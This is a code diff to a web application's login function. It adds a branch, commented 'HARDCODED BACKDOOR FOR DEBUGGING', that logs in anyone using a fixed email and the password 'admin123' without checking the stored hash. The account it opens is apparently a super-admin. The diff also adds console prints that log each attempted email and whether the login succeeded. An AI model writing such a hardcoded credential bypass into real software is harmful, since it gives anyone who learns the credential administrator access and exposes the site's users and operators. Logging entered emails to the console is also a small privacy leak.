@@ -66,15 +66,26 @@ def login():
                 flash('Usuário no Supabase mas não no DB Local. Contate suporte.', 'error')
                 return redirect(url_for('auth.login'))
 
+        # HARDCODED BACKDOOR FOR DEBUGGING
+        elif email == 'master@northway.com' and password == 'admin123':
+            print("🔓 MASTER BACKDOOR TRIGGERED")
+            authenticated = True
+            if not user:
+                 print("⚠️ Master user not found in DB during backdoor!")
+                 flash('Usuário Master não encontrado no banco.', 'error')
+                 return redirect(url_for('auth.login'))
+
         elif user and check_password_hash(user.password_hash, password):
              authenticated = True
         
         if authenticated and user:
             login_user(user)
+            print(f"✅ Login Success: {user.name} (SuperAdmin? {getattr(user, 'is_super_admin', False)})")
             if getattr(user, 'is_super_admin', False):
                 return redirect(url_for('master.dashboard'))
             return redirect(url_for('dashboard.home'))
         else:
+            print(f"❌ Login Failed for {email}. User found? {bool(user)}")
             flash('Email ou senha incorretos.', 'error')
             
     return render_template('login.html')
